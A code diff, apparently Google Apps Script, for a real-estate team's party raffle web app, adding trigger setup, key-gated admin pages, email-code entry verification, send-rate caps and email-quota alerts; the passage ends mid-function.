+    out.push('WARNING: could not open the entries sheet to share it: ' + openErr);
+  }
+
+  if (!props.getProperty(RAFFLE_ADMIN_PROP)) {
+    props.setProperty(RAFFLE_ADMIN_PROP,
+      Utilities.getUuid().replace(/-/g, '') + Utilities.getUuid().replace(/-/g, ''));
+    out.push('Generated RAFFLE_ADMIN_KEY (see Project Settings > Script Properties).');
+  } else {
+    out.push('RAFFLE_ADMIN_KEY already set.');
+  }
+  var execUrl = props.getProperty(RAFFLE_EXEC_URL_PROP) || '';
+  if (RAFFLE_EXEC_URL_RE.test(execUrl)) {
+    out.push('Public web-app URL on record: ' + execUrl);
+  } else {
+    out.push('!! ' + RAFFLE_EXEC_URL_PROP + ' is not set. Links in emails sent by the 5:00 and',
+             '!! 6:15 triggers need it. Open the public entry page once (the QR link) and it',
+             '!! records itself, or set the property to the plain .../exec URL by hand.');
+  }
+
+  // Drop any previously installed draw trigger before adding this one, so
+  // re-running setup can never arm two draws.
+  ScriptApp.getProjectTriggers().forEach(function (t) {
+    if (t.getHandlerFunction() === 'raffleScheduledDraw') ScriptApp.deleteTrigger(t);
+  });
+  var drawAt = new Date(RAFFLE_DRAW_AT);
+  if (drawAt.getTime() > Date.now()) {
+    ScriptApp.newTrigger('raffleScheduledDraw').timeBased().at(drawAt).create();
+    out.push('Draw trigger armed for ' + raffleFmt_(drawAt) + ' ET.');
+    var runner = '';
+    try { runner = Session.getEffectiveUser().getEmail(); } catch (whoErr) { runner = '(unknown)'; }
+    out.push('Trigger will run as: ' + runner + '  (whoever ran setupRaffle owns it, ' +
+             'so the 6:15 result email comes from this account)');
+  } else {
+    out.push('WARNING: RAFFLE_DRAW_AT is in the past; no trigger armed. Draw manually.');
+  }
+
+  // Hourly digest during the party (raffleEventDigest no-ops outside the window,
+  // so an hourly trigger is safe to leave armed and cheap to reason about -- an
+  // every-hour trigger that decides for itself beats six one-shot triggers that
+  // have to be individually cleaned up).
+  ScriptApp.getProjectTriggers().forEach(function (t) {
+    if (t.getHandlerFunction() === 'raffleEventDigest') ScriptApp.deleteTrigger(t);
+  });
+  ScriptApp.newTrigger('raffleEventDigest').timeBased().everyHours(1).create();
+  ScriptApp.getProjectTriggers().forEach(function (t) {
+    if (t.getHandlerFunction() === 'raffleConsentReminderSweep') ScriptApp.deleteTrigger(t);
+  });
+  // The batch itself: one shot, at one moment, so every reminder goes together.
+  var remindAt = new Date(RAFFLE_REMINDER_AT);
+  if (remindAt.getTime() > Date.now()) {
+    ScriptApp.newTrigger('raffleConsentReminderSweep').timeBased().at(remindAt).create();
+    out.push('Reminder batch armed for ' + raffleFmt_(remindAt) + ' ET — one send, all at once.');
+  } else {
+    out.push('NOTE: RAFFLE_REMINDER_AT is in the past; no batch trigger armed.');
+  }
+  // Hourly catch-up. It does nothing once the batch marker is set, so it cannot
+  // stagger the send -- it exists because a one-shot trigger that fails to fire
+  // fails silently, and nobody would notice until the draw.
+  ScriptApp.newTrigger('raffleConsentReminderSweep').timeBased().everyHours(1).create();
+  out.push('Hourly catch-up armed in case the batch trigger misfires.');
+  out.push('Hourly entry digest armed (silent outside 3:00-6:15 PM on the day).');
+  out.push('Before the party you get an email every ' + RAFFLE_MILESTONE_EVERY +
+           ' people entered instead.');
+
+  var msg = out.join('\n');
+  Logger.log(msg);
+  return msg;
+}
+
+// Prints every URL you need, COMPLETE -- no placeholders to fill in by hand.
+// Run it from the editor and copy the output. The status/draw links carry the
+// admin key and the test link carries the QA secret, so treat the output like a
+// password: do not paste it into a doc or a chat.
+function raffleAdminLinks() {
+  var props = PropertiesService.getScriptProperties();
+  var key = props.getProperty(RAFFLE_ADMIN_PROP);
+  if (!key) throw new Error('Run setupRaffle() first.');
+  var base = raffleBaseUrl_();
+  var sheetId = props.getProperty(RAFFLE_SHEET_PROP);
+
+  var out = [
+    'PUBLIC — this is the QR / the link you share. No key, safe to print:',
+    '  ' + base + '?form=raffle',
+    '',
+    'KIOSK — for the iPad at the table, auto-resets after each entry:',
+    '  ' + base + '?form=raffle&kiosk=1',
+    '',
+    'LIVE ENTRY COUNT (private):',
+    '  ' + base + '?form=raffle&action=status&key=' + key,
+    '',
+    'MANUAL DRAW — backup if the 6:15 trigger misfires (private):',
+    '  ' + base + '?form=raffle&action=draw&key=' + key,
+    '',
+    '  Before 6:15 this link refuses and tells you so. The draw cannot be undone,',
+    '  so drawing early has to be asked for twice — add &force=1 only if you really',
+    '  mean to close entries now:',
+    '  ' + base + '?form=raffle&action=draw&key=' + key + '&force=1',
+    '',
+  ];
+  if (!RAFFLE_EXEC_URL_RE.test(base)) {
+    out.unshift('!! These links are built from ' + (base || '(no URL)') + ', which is NOT the',
+                '!! public web-app URL (you ran this from the editor, so it is the /dev URL).',
+                '!! Open the public entry page once after deploying and run this again, or set',
+                '!! the ' + RAFFLE_EXEC_URL_PROP + ' script property to the plain .../exec URL.', '');
+  }
+
+  // The QA secret is a separate property, shared with the other two forms. If it
+  // is missing the test URLs cannot work, so say that outright rather than
+  // printing a link with a placeholder in it that looks like it should work.
+  var qa = props.getProperty(QA_TEST_SECRET_PROPERTY);
+  out.push('--- TEST MODE ---');
+  if (qa) {
+    out.push('TEST FORM — works any day, writes to the "' + RAFFLE_TEST_SHEET_NAME + '" tab:',
+             '  ' + base + '?form=raffle&qatest=' + qa,
+             '',
+             'TEST ENTRY COUNT:',
+             '  ' + base + '?form=raffle&action=status&key=' + key + '&test=1',
+             '',
+             'TEST DRAW — rehearses the real thing, emails ' + QA_TEST_NOTIFY_EMAIL + ' and ' + RAFFLE_REHEARSAL_CC + ':',
+             '  ' + base + '?form=raffle&action=draw&key=' + key + '&test=1',
+             '',
+             'REHEARSAL CONSOLE — the full 6:30 walk-through on the test draw; the winner',
+             '  email goes to ' + QA_TEST_NOTIFY_EMAIL + ' and ' + RAFFLE_REHEARSAL_CC + ', the ceiling button only reports:',
+             '  ' + base + '?form=raffle&action=console&key=' + key + '&test=1',
+             '',
+             'Rehearse in this order: test form (enter two people) -> test draw -> rehearsal',
+             'console (preview, send). Run raffleResetTest() to wipe test data and go again.');
+  } else {
+    out.push('NOT AVAILABLE: the "' + QA_TEST_SECRET_PROPERTY + '" script property is not set,',
+             'so ?qatest= does nothing and every test URL would just serve the live page.',
+             'Set it in Project Settings > Script Properties (any hard-to-guess string),',
+             'then re-run raffleAdminLinks(). The other two public forms use this same',
+             'property, so if they have test mode working it is already set.');
+  }
+
+  out.push('DRAW CONSOLE — this is the one to use at the party:',
+           '  ' + base + '?form=raffle&action=console&key=' + key,
+           '',
+           '  All three picks with FUB links (theirs and their referral\'s), pick one,',
+           '  preview the exact email, confirm, send. Emergency redraw is on the same page.',
+           '  The 6:15 result email links straight here. Test version: &test=1.',
+           '',
+           'EMAIL THE WINNER DIRECTLY (skips the console; sends to pick 1):',
+           '  ' + base + '?form=raffle&action=notifywinner&key=' + key,
+           '',
+           '  Deliberately not automatic. The draw runs at 6:15 and you announce at ' +
+           RAFFLE_ANNOUNCE_AT + ', so an',
+           '  automatic email would reach the winner before you say their name. It sends once;',
+           '  you and Ryan are copied and replies go to ' + RAFFLE_WINNER_REPLY_TO + '.',
+           '');
+
+  if (sheetId) {
+    out.push('', 'ENTRIES SHEET:',
+             '  https://docs.google.com/spreadsheets/d/' + sheetId + '/edit');
+  }
+
+  var msg = out.join('\n');
+  Logger.log(msg);
+  return msg;
+}
+
+// ---------- doGet branch (reached from Code.gs's one-line hook) ----------
+function raffleServeForm_(e, baseUrl, chain) {
+  raffleRememberExecUrl_(baseUrl);
+  var action = (e.parameter.action || '').toString().toLowerCase();
+  // ?qatest=<QA_TEST_SECRET> mints the token AND flips this execution into test
+  // mode. A wrong or absent value returns '' and renders the ordinary live page,
+  // so nothing about the response reveals whether the secret was close.
+  var qaTestToken = issueQaTestToken_(e);
+  var isTest = !!qaTestToken;
+
+  // The link in the referral's email. No key: the token in ?t= is the credential,
+  // and it only ever unlocks that one person's own record.
+  if (action === RAFFLE_CONSENT_ACTION) return raffleConsentPage_(e);
+  // The chain invite's link: a confirmed referral entering by referring someone.
+  if (action === RAFFLE_CHAIN_ACTION) return raffleChainStart_(e);
+
+  // Every admin action goes through ONE gate. Adding a branch inside this block
+  // without adding its name here is a silent dead end: the action falls through
+  // and serves the public entry form instead, which is exactly what happened to
+  // 'console' and 'notifywinner' until test_raffle.js caught it (2026-09-17).
+  var RAFFLE_ADMIN_ACTIONS = ['status', 'draw', 'console', 'notifywinner'];
+  if (RAFFLE_ADMIN_ACTIONS.indexOf(action) !== -1) {
+    var key = PropertiesService.getScriptProperties().getProperty(RAFFLE_ADMIN_PROP);
+    // Constant-ish comparison and an identical response for a wrong key as for
+    // no key, so this can't be probed.
+    if (!key || (e.parameter.key || '').toString() !== key) {
+      return HtmlService.createHtmlOutput('<p style="font-family:sans-serif">Not found.</p>');
+    }
+    // Admin endpoints pick their mode from ?test=1 rather than from the page
+    // token, so a rehearsal draw can be fired straight from a bookmark.
+    var adminTest = String(e.parameter.test || '') === '1';
+    if (action === 'status') return raffleStatusPage_(adminTest);
+    if (action === 'console') {
+      return raffleWinnerConsolePage_(adminTest, e.parameter.key);
+    }
+    if (action === 'notifywinner') {
+      var sent = raffleSendWinnerEmail_(adminTest);
+      return HtmlService.createHtmlOutput(
+        '<div style="font-family:system-ui,sans-serif;padding:24px;max-width:520px">' +
+        '<h2 style="margin:0 0 10px">' + (sent.ok ? 'Winner emailed' : 'Not sent') + '</h2>' +
+        '<p>' + raffleEsc_(sent.message) + '</p></div>');
+    }
+    return raffleDrawPage_(adminTest, String(e.parameter.force || '') === '1');
+  }
+
+  var tmpl = HtmlService.createTemplateFromFile('RaffleForm');
+  // A chain entrant arrives already verified (they clicked a link only their own
+  // inbox received), so the page opens at the referral step with their session in
+  // hand. No chain context = the ordinary first-time flow, unchanged.
+  chain = chain || {};
+  tmpl.chainVid   = safeJsonForScript_(chain.chainVid || '');
+  tmpl.chainFirst = safeJsonForScript_(chain.chainFirst || '');
+  if (chain.chainTest) isTest = true;
+  tmpl.submitToken   = getSubmitToken();
+  tmpl.baseUrl       = baseUrl;
+  tmpl.kiosk         = (e.parameter.kiosk || '') ? '1' : '';
+  tmpl.qaTestToken   = qaTestToken;   // '' on every normal load
+  tmpl.isTest        = isTest ? '1' : '';
+  tmpl.prizeShort    = RAFFLE_PRIZE_SHORT;
+  tmpl.announceAt    = RAFFLE_ANNOUNCE_AT;
+  // The page runs its own clock: it counts down to 3:00, opens itself, and goes
+  // dead at 6:15 -- all without a reload. It measures against the SERVER clock,
+  // not the visitor's, so a phone with a wrong clock still opens and closes on
+  // time. The server re-checks the window on every submit regardless.
+  // Derived from RAFFLE_EVENT_AT, never typed a second time -- change the event
+  // date in one place and every line on the page follows.
+  tmpl.eventDate     = Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'EEEE, MMMM d, yyyy');
+  tmpl.eventDateShort= Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'EEEE, MMMM d');
+  tmpl.openTime      = Utilities.formatDate(new Date(RAFFLE_EVENT_AT), RAFFLE_TZ, 'h:mm a');
+  tmpl.openAtMs      = String(new Date(RAFFLE_OPEN_AT).getTime());
+  // The Buyer/Seller timeframe dropdown, fed from FUB live (getFubTimeframes in
+  // Code.gs, cached 30 min) exactly like the Open House form's. safeJsonForScript_
+  // is what makes it safe to drop into a <script> block.
+  var raffleTfList   = raffleTimeframes_();
+  tmpl.timeframeList = safeJsonForScript_(raffleTfList);
+  tmpl.defaultTimeframe = raffleDefaultTimeframe_(raffleTfList) || '';
+  tmpl.closeAtMs     = String(new Date(RAFFLE_CLOSE_AT).getTime());
+  tmpl.serverNowMs   = String(Date.now());
+  return tmpl.evaluate()
+    .setTitle((isTest ? QA_TEST_PREFIX : '') + 'Enter to Win | ' + RAFFLE_EVENT_NAME)
+    .addMetaTag('viewport', 'width=device-width, initial-scale=1');
+}
+
+// 'before' | 'open' | 'closed' — drives what the page shows on load. The same
+// check is re-run server-side on submit; this is presentation only.
+function raffleEntryState_() {
+  var now = Date.now();
+  if (now < new Date(RAFFLE_OPEN_AT).getTime()) return 'before';
+  if (now >= new Date(RAFFLE_CLOSE_AT).getTime()) return 'closed';
+  return 'open';
+}
+
+function raffleStatusPage_(test) {
+  var rows = raffleReadEntries_(test);
+  var winner = raffleStoredWinner_(test);
+
+  // raffleReadEntries_ returns EVERY row, pending ones included, so the headline
+  // number has to be computed rather than taken from rows.length -- that read
+  // "N eligible entries" while counting rows nobody had consented to. What is
+  // actually worth knowing is how many PEOPLE are in, how many tickets they
+  // hold, and how much is still sitting in referrals that have not replied.
+  var eligible = rows.filter(function (r) { return r.status === RAFFLE_STATUS_ELIGIBLE; });
+  var pending = rows.filter(function (r) { return r.status === RAFFLE_STATUS_PENDING; }).length;
+  var people = {}, tickets = 0;
+  eligible.forEach(function (r) {
+    people[r.emailKey || ('row' + r.row)] = true;
+    tickets += Math.max(1, Number(r.tickets) || 1);
+  });
+  var peopleCount = Object.keys(people).length;
+
+  var html = '<div style="font-family:system-ui,sans-serif;padding:24px;max-width:520px">' +
+    (test ? '<div style="background:#b3271e;color:#fff;font-weight:700;padding:10px 12px;' +
+            'border-radius:6px;margin-bottom:14px">TEST DATA — not the live raffle</div>' : '') +
+    '<h2 style="margin:0 0 4px">' + RAFFLE_EVENT_NAME + '</h2>' +
+    '<p style="color:#666;margin:0 0 20px">Entry state: <b>' + raffleEntryState_() + '</b></p>' +
+    '<div style="font-size:64px;font-weight:700;color:#15464A;line-height:1">' + peopleCount + '</div>' +
+    '<div style="color:#666;margin-bottom:6px">' + (test ? 'TEST ' : '') + 'people entered</div>' +
+    '<div style="color:#666;margin-bottom:20px">' + tickets + ' tickets in the draw &middot; ' +
+      eligible.length + ' eligible rows &middot; ' + pending + ' referral(s) still pending ' +
+      '(worth ' + (pending * RAFFLE_BONUS_TICKETS_PER_REFERRAL) + ' more)</div>';
+  if (winner) {
+    html += '<div style="background:#15464A;color:#fff;padding:16px;border-radius:8px">' +
+      '<div style="opacity:.8;font-size:12px;letter-spacing:1px">WINNER DRAWN ' + raffleEsc_(winner.drawnAt) + '</div>' +
+      '<div style="font-size:22px;font-weight:700;margin-top:4px">' + raffleEsc_(winner.winner.name) + '</div></div>';
+  } else {
+    html += '<p style="color:#666">No winner drawn yet. Draw is armed for ' +
+      raffleFmt_(new Date(RAFFLE_DRAW_AT)) + ' ET.</p>';
+  }
+  html += '</div>';
+  return HtmlService.createHtmlOutput(html);
+}
+
+function raffleDrawPage_(test, force) {
+  var res = raffleDrawWinner_(test, force);
+  if (!res.ok) {
+    return HtmlService.createHtmlOutput(
+      '<div style="font-family:system-ui,sans-serif;padding:24px"><h2>Draw not completed</h2><p>' +
+      raffleEsc_(res.error) + '</p></div>');
+  }
+  var w = res.result.winner;
+  var html = '<div style="font-family:system-ui,sans-serif;padding:24px;max-width:520px">' +
+    (test ? '<div style="background:#b3271e;color:#fff;font-weight:700;padding:10px 12px;' +
+            'border-radius:6px;margin-bottom:14px">TEST DRAW — the real 6:15 draw is untouched</div>' : '') +
+    (res.alreadyDrawn ? '<p style="background:#fff3cd;padding:10px;border-radius:6px">' +
+      'A winner was already drawn at ' + raffleEsc_(res.result.drawnAt) + '. Showing that result — ' +
+      'the draw is deliberately not repeatable.</p>' : '') +
+    '<div style="background:#15464A;color:#fff;padding:24px;border-radius:8px;text-align:center">' +
+    '<div style="opacity:.8;font-size:12px;letter-spacing:2px">WINNER</div>' +
+    '<div style="font-size:30px;font-weight:700;margin:8px 0">' + raffleEsc_(w.name) + '</div>' +
+    '<div style="opacity:.9">' + raffleEsc_(w.phone) + '<br>' + raffleEsc_(w.email) + '</div></div>' +
+    '<p style="color:#666">Drawn from ' + res.result.totalEligible + ' eligible entries (' +
+      res.result.totalPeople + ' people, ' + res.result.totalTickets + ' tickets) at ' +
+    raffleEsc_(res.result.drawnAt) + ' ET.</p>';
+  if (res.result.backups.length) {
+    html += '<p style="color:#666"><b>Backups</b> (if the winner has left):<br>' +
+      res.result.backups.map(function (b, i) {
+        return (i + 1) + '. ' + raffleEsc_(b.name) + ' — ' + raffleEsc_(b.phone);
+      }).join('<br>') + '</p>';
+  }
+  html += '</div>';
+  return HtmlService.createHtmlOutput(html);
+}
+
+// ---------- Entry submission (reached from Code.gs's one-line doPost hook) ----------
+// checkSubmitToken() and checkRateLimit() have ALREADY run in doPost before this
+// is called, as has sanitizeSubmission() and the honeypot check. Do not re-do
+// them here; do not skip them by calling this from anywhere else.
+function raffleHandleSubmission_(d) {
+  // Resolved by setQaTestModeFromPayload_ in doPost, before this hook is
+  // reached. Read once here so every branch below agrees on which mode it is.
+  var test = isQaTestMode_();
+  try {
+    var step = String((d && d.step) || 'request').toLowerCase();
+    if (step === 'verify')   return raffleVerifyCode_(d, test);
+    if (step === 'referral') return raffleSubmitReferral_(d, test);
+    if (step === 'invite')   return raffleSendReferralInvite_(d, test);
+    // The consent POST comes from the referred person, who has no session and no
+    // test-mode token: which tab their row lives in is what decides test-ness.
+    if (step === 'consent')  return raffleConsentSubmit_(d);
+    // The draw console's own POSTs. Key-gated inside raffleConsoleAction_ -- this
+    // is an admin surface reached through the same public doPost as everything
+    // else, so it carries its own gate rather than trusting the route.
+    if (step === 'console')  return raffleConsoleAction_(d);
+    return raffleRequestCode_(d, test);
+  } catch (err) {
+    if (err && err.isValidation) return jsonOut({ ok: false, error: err.message });
+    Logger.log('raffleHandleSubmission_ error: ' + (err && err.stack ? err.stack : err));
+    try {
+      sendErrorAlert('Raffle: submission exception', (err && err.stack ? err.stack : String(err)));
+    } catch (alertErr) { /* never let the alert swallow the response */ }
+    return jsonOut({ ok: false, error: 'Something went wrong. Grab someone from TSG and we will get you entered.' });
+  }
+}
+
+// ---------- Step 1: validate, then email a code ----------
+// Writes NOTHING durable. The entry only exists in the script cache, keyed by a
+// server-generated id, until the code comes back.
+function raffleRequestCode_(d, test) {
+  // Window check FIRST. If entries are shut, say so -- do not make someone fix a
+  // typo in a field only to then be told they were too late anyway.
+  // This is the one check test mode relaxes; see the RAFFLE_TEST_* block.
+  var state = raffleEntryState_();
+  // Announce the bypass only when it changed something. Entries have been open
+  // since RAFFLE_OPEN_AT, so until 6:15 on the day this check passes on its own
+  // and the announcement was thirty lines of noise per run -- the lines the FUB
+  // 401s and the relationship 400s were buried in. (Durand, 2026-09-17.)
+  if (test && state !== 'open') {
+    Logger.log('RAFFLE TEST MODE: entry-window check BYPASSED (real state was "' + state +
+      '"). This is the only check test mode relaxes; the entry is being written to the "' +
+      RAFFLE_TEST_SHEET_NAME + '" tab and cannot be drawn as the real winner.');
+  } else {
+    if (state === 'before') {
+      throw makeValidationError('Entries are not open yet. Come find us at the party!');
+    }
+    if (state === 'closed') {
+      throw makeValidationError('Entries are closed — the winner is announced at ' +
+        RAFFLE_ANNOUNCE_AT + '. Thanks for coming out!');
+    }
+  }
+
+  var name  = collapseSpaces(d.fullName);
+  if (!name) throw makeValidationError('Enter your full name.');
+  if (name.indexOf(' ') === -1) throw makeValidationError('Enter your first and last name.');
+  raffleRejectJunkName_(name);
+  var email  = raffleRejectJunkEmail_(d.email);
+  var digits = raffleRejectJunkPhone_(d.phone);
+  // collapseSpaces, not trim: trim only strips the ENDS, so a CR/LF pasted
+  // mid-value survived into the sheet cell and the FUB record. The name field
+  // has always used collapseSpaces; the phone field should never have differed.
+  var phone  = collapseSpaces(d.phone);
+  if (d.consent !== 'Yes') throw makeValidationError('You must accept the Official Rules to enter.');
+
+  // NO "already entered" SHORT-CIRCUIT ANY MORE. Under the multiplier rules a
+  // returning visitor is not a duplicate to be turned away -- they are somebody
+  // coming back to refer another person and collect another
+  // RAFFLE_BONUS_TICKETS_PER_REFERRAL entries, which is exactly the behaviour
+  // worth encouraging. The self-entry row is deduplicated at verification time
+  // instead, so coming back cannot mint a second free ticket.
+
+  // The per-address send cap. It matters more now that a returning visitor is no
+  // longer short-circuited: without it, somebody could request codes to the same
+  // address all afternoon.
+  raffleCheckCodeSendQuota_(raffleEmailKey_(email));
+
+  var code = String(Math.floor(100000 + Math.random() * 900000));
+  var vid  = Utilities.getUuid();
+  CacheService.getScriptCache().put(RAFFLE_PENDING_PREFIX + vid, JSON.stringify({
+    name: name, email: email, phone: phone, code: code, attempts: 0, test: !!test
+  }), RAFFLE_CODE_TTL_SECONDS);
+
+  // NO bcc HERE, ON PURPOSE. Durand is copied on every other email this project
+  // sends (raffleOversightBcc_), but not this one: the six-digit code is a
+  // credential, and copying every entrant's code to a second mailbox turns a
+  // one-time secret into a standing collection of them. If you are adding
+  // oversight copies, this is the email to leave alone.
+  MailApp.sendEmail({
+    to: email,
+    subject: (test ? QA_TEST_PREFIX : '') + 'Your TSG Block Party entry code: ' + code,
+    body: [
+      'Your entry code is ' + code,
+      '',
+      'Type it back on the entry page to finish entering the drawing for',
+      RAFFLE_PRIZE_SHORT + ' at the TSG Block Party.',
+      '',
+      'This code expires in 15 minutes. If you did not request it, ignore this email —',
+      'nothing has been entered and we will not contact you.',
+      '',
+      'The Stawasz Group · Keller Williams Empower',
+      '728 S Broad St, Philadelphia, PA 19146 · (215) 760-6291'
+    ].join('\n')
+  });
+
+  Logger.log('Raffle: verification code emailed (vid ' + vid + ', test=' + !!test + ').');
+  return jsonOut({ ok: true, needsCode: true, vid: vid,
+    message: 'We emailed a 6-digit code to ' + email + '.' });
+}
+
+// Throws a validation error -- i.e. a message the entrant sees -- rather than
+// failing silently, so a real person who genuinely did not get the first code
+// is told what to do (find someone from TSG) instead of tapping a dead button.
+//
+// Both counters are incremented under the script lock: the read-modify-write on
+// a shared cache key is otherwise not atomic, and a concurrent burst is exactly
+// the case the cap exists for. Failing to get the lock counts as over-cap
+// (fail closed), matching checkRateLimit()'s behaviour in Code.gs.
+function raffleCheckCodeSendQuota_(emailKey, recipients) {
+  // How many addresses this send will be charged for (to + oversight copies).
+  recipients = Math.max(1, Math.round(Number(recipients) || 1));
+  var cache = CacheService.getScriptCache();
+  var lock = LockService.getScriptLock();
+  var haveLock = false;
+  try { haveLock = lock.tryLock(1000); } catch (lockErr) { haveLock = false; }
+  if (!haveLock) {
+    throw makeValidationError('We are sending a lot of codes right now — wait a moment and tap Enter again.');
+  }
+  try {
+    var addrKey = RAFFLE_CODE_SEND_PREFIX + emailKey;
+    var addrCount = Number(cache.get(addrKey) || 0);
+    if (addrCount >= RAFFLE_CODE_MAX_PER_ADDRESS) {
+      Logger.log('Raffle: code-send cap hit for one address (' + addrCount + ' in the last hour).');
+      throw makeValidationError('We have already emailed several codes to that address. ' +
+        'Check your inbox and spam folder, or grab someone from TSG and we will enter you.');
+    }
+    var bucket = Math.floor(Date.now() / (RAFFLE_CODE_GLOBAL_WINDOW_SECONDS * 1000));
+    var globalKey = RAFFLE_CODE_GLOBAL_PREFIX + bucket;
+    var globalCount = Number(cache.get(globalKey) || 0);
+    var ceiling = raffleCodeCeiling_();
+    if (globalCount + recipients > ceiling) {
+      Logger.log('Raffle: GLOBAL send ceiling hit (' + globalCount + ' of ' + ceiling +
+                 ' recipients). Possible abuse.');
+      try {
+        sendErrorAlert('Raffle: verification-email ceiling hit',
+          'The ' + (RAFFLE_CODE_GLOBAL_WINDOW_SECONDS / 3600) + '-hour ceiling of ' +
+          ceiling + ' email recipients (codes, invites and reminders) has been reached, so ' +
+          'further codes are being refused to protect the daily send quota (which the Open ' +
+          'House form and these alerts also rely on).\n\nIf this is a real crowd and not ' +
+          'abuse, open the draw console and press "Raise the ceiling" under Email budget -- ' +
+          'it adds ' + RAFFLE_CEILING_STEP + ' without a redeploy. If it is abuse, entries can ' +
+          'be taken on paper and typed in afterwards.');
+      } catch (alertErr) { /* the alert must never swallow the response */ }
+      throw makeValidationError('We cannot send codes right now. Grab someone from TSG and ' +
+        'we will get you entered.');
+    }
+
+    // The daily quota itself. -1 means the reading failed; never refuse on a
+    // reading we do not have, because a broken meter is not an empty tank.
+    var left = -1;
+    try { left = Number(MailApp.getRemainingDailyQuota()); } catch (qErr) { left = -1; }
+    if (isNaN(left)) left = -1;
+    if (left >= 0 && left - recipients < RAFFLE_MAIL_RESERVE) {
+      Logger.log('Raffle: daily send quota at the reserve (' + left + ' left, ' +
+                 recipients + ' wanted, reserve ' + RAFFLE_MAIL_RESERVE + ').');
+      var reserveKey = RAFFLE_MAIL_RESERVE_ALERT_PREFIX + bucket;
+      if (!cache.get(reserveKey)) {
+        cache.put(reserveKey, '1', RAFFLE_CODE_GLOBAL_WINDOW_SECONDS);
+        try {
+          sendErrorAlert('Raffle: daily email quota exhausted',
+            'The account has ' + left + ' email recipients left today and the raffle keeps ' +
+            RAFFLE_MAIL_RESERVE + ' back for the result, the winner email and alerts, so ' +
+            'verification codes, invites and reminders are now being REFUSED. Entrants see ' +
+            '"grab someone from TSG". Take entries on paper and type them in after the quota ' +
+            'resets (Google refreshes it at the end of a rolling 24-hour window).\n\n' +
+            'Every email this account sends counts against the same 1,500 -- the Open House ' +
+            'form and QA runs included.');
+        } catch (alertErr) { /* the alert must never swallow the response */ }
+      }
+      throw makeValidationError('We cannot send codes right now. Grab someone from TSG and ' +
+        'we will get you entered.');
+    }
+
+    cache.put(addrKey, String(addrCount + 1), RAFFLE_CODE_ADDRESS_WINDOW_SECONDS);
+    cache.put(globalKey, String(globalCount + recipients), RAFFLE_CODE_GLOBAL_WINDOW_SECONDS);
+    // Inside the lock on purpose: the readings list is a read-modify-write.
+    raffleWatchMailQuota_(left);
+  } finally {
+    try { lock.releaseLock(); } catch (releaseErr) { /* non-fatal */ }
+  }
+}
+
+// The ceiling in force: the constant, or the console's override if higher.
+function raffleCodeCeiling_() {
+  var o = 0;
+  try { o = Number(PropertiesService.getScriptProperties().getProperty(RAFFLE_CEILING_OVERRIDE_PROP)) || 0; }
+  catch (err) { o = 0; }
+  return Math.max(RAFFLE_CODE_MAX_GLOBAL, o);
+}
+
+// The console's button. Live only: a rehearsal must not change a live setting,
+// so in test mode it reports what it would do and changes nothing.
+function raffleRaiseCeiling_(test) {
+  var cur = raffleCodeCeiling_();
+  var next = cur + RAFFLE_CEILING_STEP;
+  if (test) {
+    return { ok: true, ceiling: cur, changed: false,
+      message: 'Rehearsal: nothing changed. Live, this would raise the six-hour ceiling from ' +
+               cur + ' to ' + next + ' recipients.' };
+  }
+  PropertiesService.getScriptProperties().setProperty(RAFFLE_CEILING_OVERRIDE_PROP, String(next));
+  Logger.log('Raffle: six-hour send ceiling raised from the console: ' + cur + ' -> ' + next);
+  return { ok: true, ceiling: next, changed: true,
+    message: 'Ceiling raised to ' + next + ' recipients per six hours (was ' + cur + '). ' +
+             'Google\'s own 1,500 a day is unchanged -- nothing can raise that.' };
+}
+
+// Everything the console's Email budget panel shows, in one read.
+function raffleBudgetSnapshot_(test) {
+  var out = { left: -1, reserve: RAFFLE_MAIL_RESERVE, base: RAFFLE_CODE_MAX_GLOBAL,
+              ceiling: raffleCodeCeiling_(), used: 0, projection: null };
+  try { out.left = Number(MailApp.getRemainingDailyQuota()); } catch (err) { out.left = -1; }
+  if (isNaN(out.left)) out.left = -1;
+  try {
+    out.used = Number(CacheService.getScriptCache().get(RAFFLE_CODE_GLOBAL_PREFIX +
+      Math.floor(Date.now() / (RAFFLE_CODE_GLOBAL_WINDOW_SECONDS * 1000))) || 0);
+  } catch (err2) { out.used = 0; }
+  if (!test) {
+    try {
+      var readings = JSON.parse(PropertiesService.getScriptProperties()
+                                  .getProperty(RAFFLE_QUOTA_READINGS_PROP) || '[]');
+      out.projection = raffleQuotaProjection_(readings, Date.now(),
+        new Date(RAFFLE_CLOSE_AT).getTime(), RAFFLE_MAIL_RESERVE);
+    } catch (err3) { out.projection = null; }
+  }
+  return out;
+}
+
+// Records a quota reading during the event and raises the one run-out alert.
+// Pure arithmetic lives in raffleQuotaProjection_ so it can be tested without a
+// clock. Returns the projection (or null when idle) for the digest to print.
+function raffleWatchMailQuota_(left, nowMs) {
+  try {
+    var now = nowMs || Date.now();
+    var start = new Date(RAFFLE_EVENT_AT).getTime();
+    var close = new Date(RAFFLE_CLOSE_AT).getTime();
+    if (!(left >= 0) || now < start || now >= close) return null;
+
+    var props = PropertiesService.getScriptProperties();
+    var readings = [];
+    try { readings = JSON.parse(props.getProperty(RAFFLE_QUOTA_READINGS_PROP) || '[]'); }
+    catch (parseErr) { readings = []; }
+    if (!Array.isArray(readings)) readings = [];
+    readings.push({ t: now, left: left });
+    // Keep the party's first reading (the "since the start" rate) plus the last
+    // hour (the "recent" rate); everything in between has done its job.
+    readings = [readings[0]].concat(readings.slice(1).filter(function (r) {
+      return r && (now - Number(r.t)) <= RAFFLE_QUOTA_RECENT_MS; }));
+    props.setProperty(RAFFLE_QUOTA_READINGS_PROP, JSON.stringify(readings));
+
+    var p = raffleQuotaProjection_(readings, now, close, RAFFLE_MAIL_RESERVE);
+    if (p && p.alert && !props.getProperty(RAFFLE_QUOTA_ALERT_PROP)) {
+      props.setProperty(RAFFLE_QUOTA_ALERT_PROP, raffleFmt_(raffleNow_()));
+      MailApp.sendEmail({
+        to: RAFFLE_NOTIFY_EMAIL,
+        name: 'TSG Block Party Raffle',
+        subject: '⚠️ Raffle email may run out before 6:15 (' + left + ' left)',
+        body: [
+          'At the current rate the account runs out of email before entries close.',
+          '',
+          '  Left now:        ' + left + ' recipients',
+          '  Burning:         ~' + Math.round(p.ratePerHour) + ' per hour',
+          '  Runs out around: ' + raffleFmt_(new Date(p.runsOutAt)) + ' ET (reserve of ' +
+            RAFFLE_MAIL_RESERVE + ' kept back for the result and winner emails)',
+          '  Entries close:   ' + raffleFmt_(new Date(close)) + ' ET',
+          '  Projected left at close: ' + p.projectedLeft,
+          '',
